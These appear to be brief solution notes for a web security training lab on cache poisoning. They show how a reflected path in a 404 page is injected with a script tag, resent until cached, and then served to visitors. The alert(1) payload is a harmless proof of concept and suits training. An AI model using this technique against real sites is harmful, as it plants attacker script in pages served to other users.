/*

1) find the sink for xss
// typically a URL reflected in this case
// no URL is reflected pivot to creative thinking

a) 
GET /random
<p>
    Not Found: /random
</p>
// this also gets X-Cache:hit

2) 
GET /random</p><script>alert(1)</script><p>

<p>
    Not Found: /random
</p>
<script>
    alert(1)
</script>
<p></p>
// send till cached
// show request in browser ... alert pops

3) https://0ad100ee041925ac811a84a70087005d.web-security-academy.net/random</p><script>alert(1)</script><p>
// send after caching the 2nd step request

*/